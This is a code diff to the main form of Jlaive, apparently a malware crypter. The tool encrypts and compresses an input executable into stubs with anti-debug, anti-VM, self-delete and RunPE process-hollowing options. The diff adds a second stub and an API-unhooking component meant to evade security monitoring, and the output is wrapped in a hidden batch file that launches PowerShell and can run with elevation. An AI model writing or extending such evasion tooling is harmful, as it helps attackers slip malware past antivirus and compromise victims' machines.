@@ -13,10 +13,7 @@ namespace Jlaive
 {
     public partial class Form1 : Form
     {
-        public Form1()
-        {
-            InitializeComponent();
-        }
+        public Form1() => InitializeComponent();
 
         private void Form1_Load(object sender, EventArgs e)
         {
@@ -76,58 +73,72 @@ namespace Jlaive
             log.Items.Clear();
 
             StubGen stubgen = new StubGen(_key, _iv);
-            byte[] pbytes = File.ReadAllBytes(_input);
+            byte[] payload = File.ReadAllBytes(_input);
             bool isnetasm = IsAssembly(_input);
 
             if (isnetasm)
             {
                 log.Items.Add("Patching assembly...");
-                pbytes = Patcher.Fix(pbytes);
+                Patcher.Fix(ref payload);
             }
 
-            log.Items.Add("Encrypting payload...");
-            byte[] payload_enc = Encrypt(Compress(pbytes), _key, _iv);
+            log.Items.Add("Compressing payload...");
+            payload = Compress(payload);
 
-            log.Items.Add("Creating stub...");
-            string stub = stubgen.CreateCS(antiDebug.Checked, antiVM.Checked, meltFile.Checked, !isnetasm);
+            log.Items.Add("Creating stubs...");
+            string stub = stubgen.CreateCS(antiDebug.Checked, antiVM.Checked, meltFile.Checked, unhookAPI.Checked, !isnetasm);
+            string stub2 = stubgen.CreateBCS();
 
-            log.Items.Add("Building stub...");
-            File.WriteAllBytes("payload.exe", payload_enc);
-            if (!isnetasm)
-            {
-                byte[] runpedll_enc = Encrypt(Compress(GetEmbeddedResource("Jlaive.Resources.runpe.dll")), _key, _iv);
-                File.WriteAllBytes("runpe.dll", runpedll_enc);
-            }
-            List<string> embeddedresources = new List<string>();
-            embeddedresources.Add("payload.exe");
-            if (!isnetasm) embeddedresources.Add("runpe.dll");
-            embeddedresources.AddRange(bindedFiles.Items.Cast<string>());
+            log.Items.Add("Building stubs...");
             Compiler compiler = new Compiler
             {
                 References = new string[] { "mscorlib.dll", "System.Core.dll", "System.dll", "System.Management.dll" },
-                Resources = embeddedresources.ToArray()
+                Resources = bindedFiles.Items.Cast<string>().ToArray()
             };
             JCompilerResult result = compiler.Build(stub);
             if (result.CompilerResults.Errors.Count > 0)
             {
-                File.Delete("payload.exe");
-                if (!isnetasm) File.Delete("runpe.dll");
                 string errors = string.Join(Environment.NewLine, result.CompilerResults.Errors.Cast<CompilerError>().Select(error => error.ErrorText));
                 MessageBox.Show($"Stub build errors:{Environment.NewLine}{errors}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 buildButton.Enabled = true;
                 return;
             }
-            File.Delete("payload.exe");
-            if (!isnetasm) File.Delete("runpe.dll");
+            byte[] stubbytes = result.AssemblyBytes;
+            compiler = new Compiler
+            {
+                References = new string[] { "mscorlib.dll", "System.Core.dll", "System.dll" }
+            };
+            result = compiler.Build(stub2);
+            if (result.CompilerResults.Errors.Count > 0)
+            {
+                string errors = string.Join(Environment.NewLine, result.CompilerResults.Errors.Cast<CompilerError>().Select(error => error.ErrorText));
+                MessageBox.Show($"Stub build errors:{Environment.NewLine}{errors}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                buildButton.Enabled = true;
+                return;
+            }
+            byte[] stubbytes2 = result.AssemblyBytes;
 
-            log.Items.Add("Encrypting stub...");
-            byte[] stub_enc = Encrypt(Compress(result.AssemblyBytes), _key, _iv);
+            log.Items.Add("Embedding resources...");
+            List<PatcherResource> embeddedresources = new List<PatcherResource>() { new PatcherResource("JLAIVE_P", payload) };
+            if (!isnetasm)
+            {
+                embeddedresources.Add(new PatcherResource("JLAIVE_RP", Compress(GetEmbeddedResource("Jlaive.Resources.runpe.dll"))));
+            }
+            if (unhookAPI.Checked)
+            {
+                embeddedresources.Add(new PatcherResource("JLAIVE_AU", Compress(GetEmbeddedResource("Jlaive.Resources.apiunhooker.exe"))));
+            }
+            Patcher.AddResources(ref stubbytes, embeddedresources.ToArray());
+
+            log.Items.Add("Encrypting stubs...");
+            byte[] stub_enc = Encrypt(Compress(stubbytes), _key, _iv);
+            byte[] stub2_enc = Encrypt(Compress(stubbytes2), _key, _iv);
 
             log.Items.Add("Creating PowerShell command...");
             string pscommand = stubgen.CreatePS();
 
             log.Items.Add("Creating batch file...");
-            string content = stubgen.CreateBat(pscommand, stub_enc, hidden.Checked, runas.Checked);
+            string content = stubgen.CreateBat(pscommand, stub_enc, stub2_enc, hidden.Checked, runas.Checked);
 
             SaveFileDialog sfd = new SaveFileDialog()
             {
@@ -165,11 +176,10 @@ namespace Jlaive
                 antiVM = antiVM.Checked,
                 selfDelete = meltFile.Checked,
                 hidden = hidden.Checked,
-                runas = runas.Checked
+                runas = runas.Checked,
+                apiUnhook = unhookAPI.Checked,
+                bindedFiles = bindedFiles.Items.Cast<string>().ToArray()
             };
-            List<string> paths = new List<string>();
-            foreach (string item in bindedFiles.Items) paths.Add(item);
-            obj.bindedFiles = paths.ToArray();
             return obj;
         }
 
@@ -181,6 +191,7 @@ namespace Jlaive
             meltFile.Checked = obj.selfDelete;
             hidden.Checked = obj.hidden;
             runas.Checked = obj.runas;
+            unhookAPI.Checked = obj.apiUnhook;
             bindedFiles.Items.AddRange(obj.bindedFiles);
         }
     }
